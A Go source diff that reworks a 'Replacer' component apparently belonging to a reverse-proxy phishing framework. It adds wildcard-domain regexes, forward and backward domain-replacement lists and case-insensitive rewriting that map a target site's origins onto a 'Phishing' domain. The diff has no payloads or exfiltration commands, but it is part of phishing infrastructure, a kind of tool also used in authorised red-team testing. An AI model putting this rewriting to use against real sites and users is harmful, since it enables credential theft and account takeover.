@@ -4,6 +4,8 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
+	"regexp"
+	"sort"
 	"strings"
 	"sync"
 
@@ -15,7 +17,7 @@ import (
 
 const ReplaceFile = "session.json"
 const CustomWildcardSeparator = "---"
-const WildcardPrefix = "wld"
+const WildcardLabel = "wld"
 
 // Replacer structure used to populate the transformation rules
 type Replacer struct {
@@ -27,14 +29,14 @@ type Replacer struct {
 	WildcardMapping               map[string]string
 	CustomResponseTransformations [][]string
 	ForwardReplacements           []string `json:"-"`
+	ForwardWildcardReplacements   []string `json:"-"`
 	BackwardReplacements          []string `json:"-"`
+	BackwardWildcardReplacements  []string `json:"-"`
 	LastForwardReplacements       []string `json:"-"`
 	LastBackwardReplacements      []string `json:"-"`
 	WildcardDomain                string   `json:"-"`
 
-	// Ignore from JSON export
-	loopCount int
-	mu        sync.RWMutex
+	mu sync.RWMutex
 }
 
 // Init initializes the Replacer struct.
@@ -61,12 +63,12 @@ func (r *Replacer) Init(s session.Session) error {
 
 	r.SetExternalOrigins(s.Config.Crawler.ExternalOrigins)
 	r.SetOrigins(s.Config.Crawler.OriginsMapping)
-	r.SetCustomResponseTransformations(s.Config.Transform.Response.Custom)
 
 	if err = r.DomainMapping(); err != nil {
 		return err
 	}
 
+	r.SetCustomResponseTransformations(s.Config.Transform.Response.Custom)
 	r.MakeReplacements()
 
 	// Save the replacer
@@ -78,15 +80,48 @@ func (r *Replacer) Init(s session.Session) error {
 	return nil
 }
 
+// WildcardPrefix returns the wildcard prefix used in the transformation rules.
+func (r *Replacer) WildcardPrefix() string {
+	// XXXwld
+	return fmt.Sprintf("%s%s", r.ExternalOriginPrefix, WildcardLabel)
+}
+
+// getCustomWildCardSeparator returns the custom wildcard separator used in the transformation rules.
+// <CustomWildcardSeparator><ExternalOriginPrefix><WildcardLabel>
+func (r *Replacer) getCustomWildCardSeparator() string {
+	return fmt.Sprintf("%s%s%s", CustomWildcardSeparator, r.ExternalOriginPrefix, WildcardLabel)
+}
+
+// WildcardRegex returns the wildcard regex used in the transformation rules.
+// Returns a string in the format [a-zA-Z0-9.-]+.WildcardPrefix()
+func (r *Replacer) WildcardRegex(custom bool) string {
+	if custom {
+		return fmt.Sprintf(`[a-zA-Z0-9\.-]+%s`, r.getCustomWildCardSeparator())
+	} else {
+		return fmt.Sprintf(`[a-zA-Z0-9\.-]+%s`, r.WildcardPrefix())
+	}
+}
+
 // SetCustomResponseTransformations sets the CustomResponseTransformations used in the transformation rules.
 func (r *Replacer) SetCustomResponseTransformations(newTransformations [][]string) {
+
+	// For each wildcard domain, create a new transformation
+	for _, wld := range r.GetWildcardMapping() {
+		w := fmt.Sprintf("%s.%s", wld, r.Phishing)
+
+		newTransformations = append(newTransformations, []string{
+			fmt.Sprintf("\"%s", w),
+			fmt.Sprintf("\"%s%s", CustomWildcardSeparator, w),
+		})
+
+		newTransformations = append(newTransformations, []string{
+			fmt.Sprintf("\".%s", w),
+			fmt.Sprintf("\"%s%s", CustomWildcardSeparator, w),
+		})
+	}
+
 	r.mu.Lock()
 	defer r.mu.Unlock()
-
-	// Append to newTransformations the wildcard custom patch:
-	// any ".wldXXXXX.domain" should be replaced with:
-	// ".wldXXXXX.domain" -> "---wldXXXX.domain"
-	// this to address dynamic JS code that uses the wildcard domain
 
 	if r.CustomResponseTransformations == nil {
 		r.CustomResponseTransformations = newTransformations
@@ -126,19 +161,16 @@ func (r *Replacer) GetExternalOrigins() []string {
 }
 
 // SetExternalOrigins sets the ExternalOrigins used in the transformation rules.
-func (r *Replacer) SetExternalOrigins(newOrigins []string) {
+func (r *Replacer) SetExternalOrigins(origins []string) {
 	r.mu.Lock()
 
 	if r.ExternalOrigin == nil {
 		r.ExternalOrigin = make([]string, 0)
 	}
 
-	// merge newOrigins to r.ExternalOrigin and avoid duplicate
-	for _, v := range ArmorDomain(newOrigins) {
-		//if strings.HasPrefix(v, "-") {
-		//	continue
-		//}
-
+	// merge origins to r.ExternalOrigin and avoid duplicate
+	for _, v := range ArmorDomain(origins) {
+		v = strings.TrimPrefix(v, ".")
 		if strings.Contains(v, r.getCustomWildCardSeparator()) {
 			continue
 		}
@@ -151,9 +183,10 @@ func (r *Replacer) SetExternalOrigins(newOrigins []string) {
 	}
 
 	r.ExternalOrigin = ArmorDomain(r.ExternalOrigin)
-	r.mu.Unlock()
 
+	r.mu.Unlock()
 	r.MakeReplacements()
+
 }
 
 // GetOrigins returns the Origins mapping used in the transformation rules.
@@ -185,11 +218,99 @@ func (r *Replacer) SetOrigins(newOrigins map[string]string) {
 
 	r.mu.Lock()
 	defer r.mu.Unlock()
+
 	// merge newOrigins to r.newOrigins and avoid duplicate
+
+	// count the number of new origins
+	count := len(r.Origins)
 	for k, v := range newOrigins {
 		k = strings.ToLower(k)
+		if v == "-1" {
+			count++
+			v = fmt.Sprintf("%d", count)
+		}
 		r.Origins[k] = v
 	}
+}
+
+// SetForwardReplacements sets the ForwardReplacements used in the transformation rules.
+func (r *Replacer) SetForwardReplacements(replacements []string) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	r.ForwardReplacements = replacements
+}
+
+// SetForwardWildcardReplacements sets the ForwardWildcardReplacements used in the transformation rules.
+func (r *Replacer) SetForwardWildcardReplacements(replacements []string) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	r.ForwardWildcardReplacements = replacements
+}
+
+// SetBackwardReplacements sets the BackwardReplacements used in the transformation rules.
+func (r *Replacer) SetBackwardReplacements(replacements []string) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	r.BackwardReplacements = replacements
+}
+
+// SetBackwardWildcardReplacements sets the BackwardWildcardReplacements used in the transformation rules.
+func (r *Replacer) SetBackwardWildcardReplacements(replacements []string) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	r.BackwardWildcardReplacements = replacements
+}
+
+// SetLastForwardReplacements sets the LastForwardReplacements used in the transformation rules.
+func (r *Replacer) SetLastForwardReplacements(replacements []string) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	r.LastForwardReplacements = replacements
+}
+
+// SetLastBackwardReplacements sets the LastBackwardReplacements used in the transformation rules.
+func (r *Replacer) SetLastBackwardReplacements(replacements []string) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	r.LastBackwardReplacements = replacements
+}
+
+// GetWildcardMapping returns the WildcardMapping used in the transformation rules.
+// It returns a copy of the internal map.
+func (r *Replacer) GetWildcardMapping() map[string]string {
+	r.mu.Lock()
+
+	// Make a copy of the WildcardMapping and return it
+	ret := make(map[string]string)
+	for k, v := range r.WildcardMapping {
+		ret[k] = v
+	}
+
+	r.mu.Unlock()
+
+	return ret
+}
+
+// SetWildcardMapping sets the WildcardMapping used in the transformation rules.
+func (r *Replacer) SetWildcardMapping(domain, mapping string) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	r.WildcardMapping[domain] = mapping
+}
+
+// SetWildcardDomain sets the WildcardDomain used in the transformation rules.
+func (r *Replacer) SetWildcardDomain(domain string) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	r.WildcardDomain = domain
 }
 
 // Contains checks if a string is contained in a slice.
@@ -207,11 +328,6 @@ func (r *Replacer) Save() error {
 	r.mu.Lock()
 	defer r.mu.Unlock()
 	return saveToJSON(ReplaceFile, r)
-}
-
-func (r *Replacer) getCustomWildCardSeparator() string {
-	// ---XXXwld
-	return fmt.Sprintf("%s%s%s", CustomWildcardSeparator, r.ExternalOriginPrefix, WildcardPrefix)
 }
 
 // saveToJSON saves the Replacer struct to a file as JSON.
@@ -247,4 +363,113 @@ func loadFromJSON(filename string) (*Replacer, error) {
 	}
 
 	return &replacer, nil
+}
+
+type replacement struct {
+	OldVal string
+	NewVal string
+}
+
+// GetBackwardReplacements returns the BackwardReplacements used in the transformation rules.
+// It returns a copy of the internal slice sorted by length in descending order.
+func (r *Replacer) GetBackwardReplacements() []string {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	return sortReplacementsByLength(r.BackwardReplacements, false)
+}
+
+// GetForwardReplacements returns the ForwardReplacements used in the transformation rules.
+// It returns a copy of the internal slice sorted by length in descending order.
+func (r *Replacer) GetForwardReplacements() []string {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	return append(
+		sortReplacementsByLength(r.ForwardReplacements, true),
+		sortReplacementsByLength(r.ForwardWildcardReplacements, true)...,
+	)
+}
+
+// GetLastForwardReplacements returns the LastForwardReplacements used in the transformation rules.
+// It returns a copy of the internal slice sorted by length in descending order.
+func (r *Replacer) GetLastForwardReplacements() []string {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	return sortReplacementsByLength(r.LastForwardReplacements, true)
+}
+
+// GetLastBackwardReplacements returns the LastBackwardReplacements used in the transformation rules.
+// It returns a copy of the internal slice sorted by length in descending order.
+func (r *Replacer) GetLastBackwardReplacements() []string {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	return append(
+		sortReplacementsByLength(r.LastBackwardReplacements, false),
+		sortReplacementsByLength(r.BackwardWildcardReplacements, false)...,
+	)
+}
+
+// caseInsensitiveReplace replaces the old values with the new values in the input string.
+func caseInsensitiveReplace(input string, r []string) (string, error) {
+	replacements, err := convertToReplacements(r)
+	if err != nil {
+		return "", err
+	}
+
+	for _, r := range replacements {
+		re, err := regexp.Compile(`(?i)` + regexp.QuoteMeta(r.OldVal))
+		if err != nil {
+			return "", err
+		}
+		input = re.ReplaceAllString(input, r.NewVal)
+	}
+	return input, nil
+}
+
+// convertToReplacements converts a slice of strings to a slice of replacements.
+func convertToReplacements(slice []string) ([]replacement, error) {
+	if len(slice)%2 != 0 {
+		return nil, fmt.Errorf("slice must have an even number of elements")
+	}
+
+	var replacements []replacement
+	for i := 0; i < len(slice); i += 2 {
+		replacements = append(replacements, replacement{
+			OldVal: slice[i],
+			NewVal: slice[i+1],
+		})
+	}
+
+	return replacements, nil
+}
+
+// sortReplacementsByLength sorts the replacements by length in descending order.
+func sortReplacementsByLength(r []string, forward bool) (new []string) {
+
+	replacements, err := convertToReplacements(r)
+	if err != nil {
+		log.Warning("Error converting replacements: %s", err)
+		return
+	}
+
+	if forward {
+		sort.Slice(replacements, func(i, j int) bool {
+			return len(replacements[i].NewVal) > len(replacements[j].NewVal)
+		})
+	} else {
+		sort.Slice(replacements, func(i, j int) bool {
+			return len(replacements[i].OldVal) > len(replacements[j].OldVal)
+		})
+	}
+
+	// convert replacements back to a slice of strings
+	new = make([]string, 0)
+	for _, rr := range replacements {
+		new = append(new, rr.OldVal, rr.NewVal)
+	}
+
+	return
 }
